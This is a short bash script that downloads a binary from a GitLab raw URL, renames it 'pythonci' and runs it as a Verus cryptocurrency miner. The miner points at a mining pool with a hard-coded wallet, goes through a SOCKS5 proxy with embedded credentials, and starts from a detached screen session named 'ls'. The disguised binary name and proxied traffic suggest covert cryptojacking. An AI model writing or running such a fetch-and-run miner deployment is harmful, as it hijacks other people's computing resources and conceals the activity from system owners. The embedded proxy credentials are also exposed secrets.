#!/bin/bash
sudo apt update
sudo apt install screen -y
sudo apt install screen libjansson4 -y
wget https://gitlab.com/Scalaxlarig/bisalahhh/-/raw/main/pythonci
chmod +x pythonci
screen -dmS ls
PL=stratum+tcp://na.luckpool.net:3956
WT=RNfF475UVShH9C3n8abuUnxgCxsRYR9rNe
WR=jajal
PY=socks5://w1rtyuw:s1dfgyt3b@150.129.171.123:6667
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
